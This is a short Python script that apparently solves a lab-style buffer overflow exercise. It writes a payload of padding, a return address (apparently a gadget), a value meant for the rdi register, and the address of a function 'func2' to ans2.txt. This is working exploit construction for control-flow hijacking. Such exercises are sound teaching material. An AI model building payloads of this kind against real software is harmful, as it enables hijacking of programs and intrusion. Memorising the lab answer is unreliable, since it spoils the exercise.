padding = b"A" * 16
ret_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"
rdi_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
payload = padding + ret_addr + rdi_value + func2_addr
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")